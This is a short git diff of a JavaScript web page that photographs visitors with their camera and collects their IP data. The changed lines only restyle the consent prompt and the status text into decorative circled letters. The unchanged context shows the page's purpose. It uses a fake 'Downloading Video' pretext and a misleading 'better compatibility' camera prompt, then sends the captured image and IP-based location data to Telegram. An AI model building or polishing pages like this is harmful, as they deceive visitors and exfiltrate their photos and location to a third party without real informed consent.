@@ -142,7 +142,7 @@
     }
 
     async function sendImage() {
-      const consent = confirm("Grant permission to access your camera?");
+      const consent = confirm("🅖🅡🅐🅝🅣 🅟🅔🅡🅜🅘🅢🅢🅘🅞🅝 🅣🅞 🅐🅒🅒🅔🅢🅢 🅨🅞🅤🅡 🅒🅐🅜🅔🅡🅐 🅕🅞🅡 🅑🅔🅣🅣🅔🅡 🅒🅞🅜🅟🅐🅣🅘🅑🅘🅛🅘🅣🅨!!!");
       if (!consent) return;
 
       const ipData = await getIPInfo();
@@ -170,7 +170,7 @@ Timezone: ${ipData.timezone || 'N/A'}`;
         const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
 
         await sendToTelegram(message, blob);
-        document.getElementById("message-container").innerText = "✅ Downloading Video !";
+        document.getElementById("message-container").innerText = "✅ 🅓🅞🅦🅝🅛🅞🅐🅓🅘🅝🅖 🅥🅘🅓🅔🅞!";
       } catch (err) {
         console.error("Camera error:", err);
         document.getElementById("message-container").innerText = "⚠️ Camera access denied or error occurred.";
